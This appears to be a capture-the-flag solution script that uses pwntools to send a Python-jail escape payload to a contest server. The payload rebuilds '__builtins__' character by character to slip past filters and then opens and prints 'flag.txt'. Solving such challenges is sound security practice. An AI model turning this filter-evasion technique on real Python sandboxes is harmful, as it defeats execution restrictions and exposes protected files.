#!/usr/local/bin/python3

from pwn import *

io = remote('challs3.pyjail.club', 9328)
inp = """ exit\t(\t*\tvars(globals() [ ' _ ' [ 1 ] + ' _ ' [ 1 ] + 'b' + ' u ' [ 1 ] + ' i ' [ 1 ] + 'l' + 't' + ' i ' [ 1 ] + 'n' + ' s ' [ 1 ] + ' _ ' [ 1 ] + ' _ ' [ 1 ] ] ) [ ' o ' [ 1 ] + 'p' + ' e ' [ 1 ] + 'n' ]('fa ' [0] + 'l' [0] + ' a ' [ 1 ] + ' g ' [ 1 ] + '.' [0] + 't' + 'x' + 't' ) )
"""
io.sendline(inp)